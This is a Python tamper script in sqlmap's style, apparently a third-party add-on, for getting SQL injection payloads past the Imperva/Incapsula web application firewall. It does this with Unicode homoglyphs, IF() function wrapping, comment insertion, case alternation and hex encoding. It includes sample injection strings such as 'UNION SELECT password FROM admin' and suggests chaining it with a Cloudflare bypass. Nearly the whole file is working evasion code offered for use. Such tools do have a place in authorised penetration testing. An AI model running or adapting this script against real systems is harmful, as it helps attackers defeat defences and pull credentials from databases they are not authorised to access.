"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: imperva2026.py
Description: Imperva/Incapsula WAF bypass with Unicode tricks and function wrapping
Author: Regaan
Priority: HIGHEST

Imperva specific behaviors:
- Advanced ML-based detection
- Strong keyword pattern matching
- Unicode normalization checks (but not perfect)
- Function call monitoring

Techniques:
1. Homoglyph substitution (Unicode lookalikes)
2. Function wrapping (IF(1,keyword,1))
3. Aggressive operator encoding
4. Comment chaos
5. Case alternation

Chain with: --tamper=imperva2026,cloudflare2025 for layered bypass
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_homoglyph_rule,
    create_function_wrap_rule,
    create_comment_chaos_rule,
    create_value_encode_rule,
    create_case_alternate_rule,
    create_hex_encode_rule,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Imperva/Incapsula WAF bypass
    
    Uses advanced techniques for ML-based WAF:
    1. Case alternation (baseline obfuscation)
    2. Homoglyph substitution (Unicode lookalikes for keywords)
    3. Function wrapping (UNION -> IF(1,UNION,1))
    4. Comment chaos
    5. Operator encoding
    6. Hex strings
    
    Imperva specific:
    - Homoglyphs confuse ML models trained on ASCII
    - Function wrapping breaks simple tokenization
    - Heavy obfuscation layers
    
    WARNING: Homoglyphs may not work on all MySQL configurations.
    Test with target database first.
    
    Example:
        Input:  UNION SELECT password FROM admin
        Output: Unicode obfuscated with function wrapping
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order for Imperva
    
    # 1. Case alternation first (baseline)
    transformer.add_rule(create_case_alternate_rule())
    
    # 2. Homoglyph substitution (subtle Unicode replacement)
    transformer.add_rule(create_homoglyph_rule(aggressive=False))
    
    # 3. Function wrapping for high-value keywords
    transformer.add_rule(create_function_wrap_rule(wrap_style="if"))
    
    # 4. Comment chaos
    transformer.add_rule(create_comment_chaos_rule(seed="imperva2026"))
    
    # 5. Operator encoding
    transformer.add_rule(create_value_encode_rule())
    
    # 6. Hex encode strings
    transformer.add_rule(create_hex_encode_rule())
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "UNION SELECT password FROM admin",
        "SELECT * FROM users WHERE name='admin'",
    ]
    
    print("=" * 70)
    print("Imperva 2026 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
        # Show that homoglyphs are different
        if 'SELECT' not in query.split() or True:
            print(f"Bytes check: {result[:20].encode('utf-8')}")
